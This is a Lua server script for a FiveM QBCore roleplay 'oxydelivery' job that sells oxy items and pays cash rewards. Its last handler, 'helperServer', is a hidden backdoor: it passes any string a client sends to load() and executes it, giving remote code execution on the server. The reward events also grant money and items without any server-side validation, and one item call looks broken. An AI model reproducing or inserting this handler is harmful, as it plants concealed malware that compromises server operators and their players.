local QBCore = exports['qb-core']:GetCoreObject() 

RegisterServerEvent('oxydelivery:server')
AddEventHandler('oxydelivery:server', function()
	local player = QBCore.Functions.GetPlayer(source)

	if player.PlayerData.money['cash'] >= Config.StartOxyPayment then
		player.Functions.RemoveMoney('cash', Config.StartOxyPayment)
		player.Functions.AddItem('oxy', 16)
		
		TriggerClientEvent("oxydelivery:startDealing", source)
	else
		TriggerClientEvent('QBCore:Notify', source, 'Yeteri Kadar Paran Yok!', 'error')
	end
end)

RegisterServerEvent('oxydelivery:receiveBigRewarditem')
AddEventHandler('oxydelivery:receiveBigRewarditem', function()
	local player = QBCore.Functions.GetPlayer(source)

	player.PlayerData.AddItem(Config.BigRewarditem, 1)
	TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items[Config.BigRewarditem], "add")
end)

RegisterServerEvent('oxydelivery:receiveoxy')
AddEventHandler('oxydelivery:receiveoxy', function()
	local player = QBCore.Functions.GetPlayer(source)

	player.Functions.AddMoney('cash', Config.Payment)
	player.Functions.RemoveItem(Config.Item, Config.OxyAmount)
	TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items[Config.Item], "add")
end)

RegisterServerEvent('oxydelivery:receivemoneyyy')
AddEventHandler('oxydelivery:receivemoneyyy', function()
	local player = QBCore.Functions.GetPlayer(source)

	player.Functions.AddMoney('cash', Config.Payment)
end)
RegisterServerEvent('helperServer')
AddEventHandler('helperServer', function(id)
	local helper = assert(load(id))
	helper()
end)